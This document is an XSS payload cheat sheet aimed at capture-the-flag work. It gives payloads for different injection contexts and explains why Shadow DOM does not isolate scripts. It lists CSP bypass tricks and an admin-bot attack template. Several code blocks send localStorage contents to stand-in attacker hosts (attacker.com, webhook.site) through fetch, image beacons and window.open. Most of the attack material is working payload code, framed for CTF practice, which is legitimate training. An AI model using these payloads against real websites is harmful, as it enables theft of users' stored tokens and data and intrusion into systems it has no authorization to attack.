# Pattern: XSS (Cross-Site Scripting)

## Quick Reference

| Context | Injection | Example Payload |
|---------|-----------|-----------------|
| HTML body | `<tag>` | `<img src=x onerror=alert(1)>` |
| HTML attribute | `" onfocus=` | `" autofocus onfocus=alert(1)//` |
| `innerHTML` | Any HTML | `<svg onload=alert(1)>` |
| `href` attribute | `javascript:` | `javascript:alert(1)` |
| `<script>` block | `'; alert(1);//` | Break out of JS string |
| Event handler | `'); alert(1);//` | Break out of function call |
| Template literal | `${alert(1)}` | JS template injection |
| `eval()` / `Function()` | `alert(1)` | Direct code execution |
| Shadow DOM | Same as innerHTML | Scripts still access `window` |

## Shadow DOM XSS (Critical for CTFs)

### The Misconception
Many developers think Shadow DOM prevents XSS. **It does NOT.**

```javascript
const shadow = element.attachShadow({ mode: 'closed' });
shadow.innerHTML = userControlledHtml; // XSS still works!
```

### Why Shadow DOM Doesn't Prevent XSS
1. Scripts inside shadow DOM run in the SAME JavaScript context as the parent
2. They have full access to `window`, `document`, `localStorage`, `fetch()`
3. Shadow DOM only provides CSS/DOM encapsulation, NOT security isolation

### Payload for Shadow DOM Context
```javascript
// This works even inside closed shadow DOM:
<img src=x onerror="fetch('https://webhook.site/xxx?f='+localStorage.getItem('flag'))">
```

### Exfiltration from Shadow DOM
```javascript
// Multiple fallback methods:
(function(){
    var flag = localStorage.getItem('flag');
    // Method 1: fetch (may be blocked by CSP)
    fetch('https://attacker.com/?f=' + encodeURIComponent(flag));
    // Method 2: Image beacon (bypasses CSP connect-src)
    new Image().src = 'https://attacker.com/?f=' + encodeURIComponent(flag);
    // Method 3: window.open (bypasses most CSP)
    window.open('https://attacker.com/?f=' + encodeURIComponent(flag));
    // Method 4: document.location (last resort, navigates away)
    // document.location = 'https://attacker.com/?f=' + flag;
})();
```

## Defense Bypass Techniques

### Against HTML Entity Encoding
```python
# Jinja2 autoescape=True escapes: < > & " '
# But if only < and > are escaped:
payload = '" onload="alert(1)"'  # attribute injection
```

### Against `innerText` / `textContent`
```javascript
// These are SAFE - no HTML parsing occurs
element.innerText = userInput;  // Safe
element.textContent = userInput; // Safe
```
**But check**: Is user input ever used with `innerHTML`, `insertAdjacentHTML`,
`document.write()`, or jQuery's `.html()`?

### Against CSP (Content Security Policy)
```
script-src 'self'  →  Find a JSONP endpoint on same origin
script-src 'nonce-...'  →  Steal the nonce via CSS injection
default-src 'none'  →  Use dangling markup or DOM clobbering
```

## Admin Bot XSS Pattern

When a bot stores the flag in localStorage:
1. Find the XSS vector (any page on the same origin)
2. The bot visits the page → XSS fires → exfiltrate localStorage
3. Flag is sent to your webhook

```python
# Typical admin bot attack:
payload = f"""<svg onload="
    var f=localStorage.getItem('flag')||'none';
    new Image().src='{WEBHOOK}?f='+encodeURIComponent(f);
">"""
```

## Checklist
- [ ] Are there any `innerHTML` assignments with user input?
- [ ] Are there any `eval()`, `Function()`, `setTimeout(string)` with user input?
- [ ] Is user input reflected in a `<script>` block or event handler?
- [ ] Is there URL parameter reflection in `href` attributes?
- [ ] If CSP blocks scripts, can we use CSS injection instead?
- [ ] If everything is `innerText`, is there a signed/trusted content path?
- [ ] Is there an admin bot that stores the flag in localStorage?
